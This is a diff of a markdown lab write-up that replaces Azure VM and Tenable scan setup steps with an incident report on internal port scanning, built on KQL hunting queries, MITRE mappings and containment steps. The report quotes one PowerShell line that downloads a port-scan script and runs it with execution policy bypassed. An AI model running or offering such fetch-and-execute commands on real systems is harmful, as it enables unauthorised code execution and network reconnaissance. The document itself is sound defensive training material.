@@ -26,89 +26,154 @@ To investigate abnormal traffic patterns originating from within the network, id
 ---
 
 
-### Step 1) Create a Windows virtual machine in the Azure portal
+🛡️ Incident Report: Internal Port Scanning Activity on 10.0.0.0/16 Network
+1. Summary
+Incident Title: Unauthorized Internal Port Scanning via PowerShell
+Date of Discovery: June 10, 2025
+Reporting Team: Security Operations / Threat Hunting
+Impacted Network Segment: 10.0.0.0/16
+Affected Host: windows-target-1 (10.0.0.5)
+TTPs Observed: T1046, T1059.001, T1078, T1105, T1204.002
+Incident Status: Contained; Reimaging in progress
 
-#### Configure the Basics Tab: 
+2. Preparation
+Observation:
+The server team reported network performance degradation affecting older devices on the 10.0.0.0/16 internal network.
 
-<img width="600" alt="vm1" src="https://github.com/user-attachments/assets/936b6db1-bfab-48c4-b9d8-c3cda0b55815" />
+Initial Assumption:
+After ruling out external threats (e.g., DDoS), internal causes such as large file transfers or port scanning were considered. The environment allows unrestricted internal traffic and the use of scripting tools like PowerShell.
 
-#### Configure the Disks Tab:
+Hypothesis:
+A compromised internal host may be engaging in lateral movement or reconnaissance via port scanning.
 
-<img width="600" alt="vm2" src="https://github.com/user-attachments/assets/2c5feeaf-246e-4ded-b660-081dad228f4e" />
+3. Data Collection
+Data Sources Queried:
 
-#### Configure the Setup Networking:
+DeviceNetworkEvents
 
-<img width="600" alt="vm3" src="https://github.com/user-attachments/assets/ac22751a-8567-4e49-991e-c049b7f63996" />
+DeviceProcessEvents
 
-#### Review + Create:
-<img width="600" alt="vm5" src="https://github.com/user-attachments/assets/5ade34fe-02e3-4369-a58f-dffd0e69384c" />
+DeviceFileEvents
 
-#### Deployment:
-<img width="600" alt="vm7" src="https://github.com/user-attachments/assets/ffc85fea-5059-468c-a595-f3cd138adb94" />
+Focus Areas:
 
----
-### Step 2) Log into the VM and disable the Windows Firewall 
+Failed network connections (potential scanning)
 
-#### Remote Desktop Connection:
+Suspicious process executions
 
-<img width="600" alt="rdp" src="https://github.com/user-attachments/assets/8dd4702d-8112-40f6-94ac-8d98e7b506d9" />
+File downloads or script execution activity
 
-#### Disable Windows Firewall 
+4. Data Analysis
+Step 1:
+Analyzed DeviceNetworkEvents for failed outbound connection attempts.
 
-<img width="600" alt="wf" src="https://github.com/user-attachments/assets/b2cc7376-5bc6-4cf1-82ad-e549a2c393ee" />
+kusto
+Copy
+Edit
+DeviceNetworkEvents
+| where ActionType == "ConnectionFailed"
+| summarize FailedConnectionsAttempts = count() by DeviceName, LocalIP
+| order by FailedConnectionsAttempts desc
+Result: IP 10.0.0.5 exhibited an unusually high number of failed connections.
 
----
+Step 2:
+Filtered for all failed connection timestamps for IP 10.0.0.5:
 
-### Step 3) Run a PowerShell command: 
-This command sets a registry key that allows local accounts to connect remotely with full administrative privileges without requiring elevation. 
+kusto
+Copy
+Edit
+DeviceNetworkEvents
+| where ActionType == "ConnectionFailed"
+| where LocalIP == "10.0.0.5"
+| order by Timestamp desc
+Finding:
+Connections were attempted to multiple ports in sequential order—indicating an automated port scan.
 
-<img width="600" alt="powershell" src="https://github.com/user-attachments/assets/7dad2e05-ecd1-4632-8203-72e80b47ea58" />
+5. Investigation
+Step 3:
+Pivoted to DeviceProcessEvents for host windows-target-1 and timestamp near suspicious activity:
 
----
+kusto
+Copy
+Edit
+let specificTime = datetime(2025-06-10T08:41:10.2458249Z);
+DeviceProcessEvents
+| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
+| where DeviceName == "windows-target-1"
+| order by Timestamp desc
+| project Timestamp, FileName, InitiatingProcessCommandLine, AccountName
+Key Finding:
+A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:
 
-### Step 4) Create a Network Security Group
-#### Inbound Security Rule to allow all traffic
+powershell
+Copy
+Edit
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
+Account:
+Executed by SYSTEM — not expected behavior; not triggered by any admin.
 
-<img width="600" alt="powershell" src="https://github.com/user-attachments/assets/cf486cee-1961-4e11-97e0-0a66e71a7028" />
+6. Response
+Actions Taken:
 
-#### Test the NSG using Ping Command: 
+Logged into the device to verify script existence.
 
-<img width="600" alt="ping command" src="https://github.com/user-attachments/assets/ee909eb2-e99b-48c9-abc9-823685faf7fa" />
+Confirmed the file portscan.ps1 existed under C:\ProgramData.
 
----
+Isolated the host from the network.
 
-### Step 5) Login to tenable
+Performed a full malware scan (no malware detected).
 
-<img width="600" alt="tenablelogin" src="https://github.com/user-attachments/assets/65aa3c73-113b-4b85-8b79-de3a142d4e4b" />
+Escalated to IT for reimaging of the device to ensure integrity.
 
----
-### Step 6) Run a Basic Scan: Unauthenticated
-#### Configure Scan basic settings
+7. MITRE ATT&CK Mapping
+markdown
+Copy
+Edit
+- T1046 - Network Service Discovery  
+  (Port scanning activity to identify open services)
 
-<img width="600" alt="scan" src="https://github.com/user-attachments/assets/3acb6537-65cf-4df7-8bdc-8ebb6543ceea" />
+- T1059.001 - Command and Scripting Interpreter: PowerShell  
+  (Execution of PowerShell script to perform scan)
 
-#### Scan Results
-<img width="600" alt="scan results" src="https://github.com/user-attachments/assets/fa337ccc-ab06-4b78-880e-982fa3ddeab1" />
+- T1078 - Valid Accounts  
+  (Script executed under SYSTEM account)
 
-#### Tenable Vulnerability Management Report
-[Tenable Vulnerability Management Report - UnAuthenticated](https://drive.google.com/file/d/11Gtks85b8GboGLymJlLQIehsnZ-NUOhL/view?usp=sharing)
+- T1105 - Ingress Tool Transfer  
+  (Script downloaded from external URL using Invoke-WebRequest)
+
+- T1204.002 - User Execution: Malicious File  
+  (Execution of suspicious PowerShell file)
+
+- T1562.001 - Impair Defenses (if applicable)  
+  (Not confirmed, but would apply if local defenses were bypassed or modified)
+8. Lessons Learned / Improvement
+Preventive Measures:
+
+Implement internal network segmentation to reduce lateral movement risk.
+
+Restrict PowerShell usage via GPO or allow-listing.
+
+Apply egress controls and file reputation filtering for outbound web requests.
+
+Increase visibility over SYSTEM-level activities on endpoints.
+
+Detection Enhancements:
+
+Create alerts for abnormal outbound connection spikes.
+
+Monitor for suspicious PowerShell usage and external script downloads.
+
+Correlate failed connection logs with script execution patterns.
+
+9. Final Status
+Threat Contained: ✅
+
+Device Isolated: ✅
+
+Malware Scan Result: Clean
+
+Device Action: Ticket submitted for full rebuild
+
+Follow-up: Review PowerShell execution policies and endpoint monitoring rules
 
 
----
-
-### Step 7) Run a Basic Scan: Authenticated
-#### Configure Credentials
-
-<img width="600" alt="credentials" src="https://github.com/user-attachments/assets/d91cbe35-6577-434a-99b7-23db1c4b0ac6" />
-
-#### Scan Results
-<img width="600" alt="scan results" src="https://github.com/user-attachments/assets/9b1c8f8e-0ff2-45d8-80a6-c801e99d5fe8" />
-
-#### Tenable Vulnerability Management Report
-[Tenable Vulnerability Management Report - Authenticated](https://drive.google.com/file/d/1crKF3tikhzv756wu7t05l9pV3MXs9rhR/view?usp=sharing)
-
-
----
-### Difference in Scan Duration
-
-![scantime](https://github.com/user-attachments/assets/c2f715f4-fbdb-429e-9fd5-d9aa93477e94)
